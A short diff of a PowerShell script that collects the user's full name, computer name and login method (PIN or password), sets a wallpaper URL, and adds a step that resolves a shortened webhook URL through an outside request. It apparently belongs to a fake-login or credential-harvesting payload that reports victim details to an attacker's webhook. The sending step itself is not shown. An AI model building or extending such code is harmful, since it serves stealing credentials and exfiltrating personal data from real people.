@@ -3,6 +3,9 @@ $u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
 $c = $env:COMPUTERNAME
 $wpURL = "https://wallpapercave.com/wp/wp1809099.jpg"
 
+# shortened URL Detection
+if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+
 # DEFAULT LOGIN METHOD
 $value = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\NgcPin" -Name "DeviceLockEnforcementPending" -ErrorAction SilentlyContinue
 if ($value -eq 0 -or $value -eq 1) {$mthd = "PIN"} else {$mthd = "Password"}
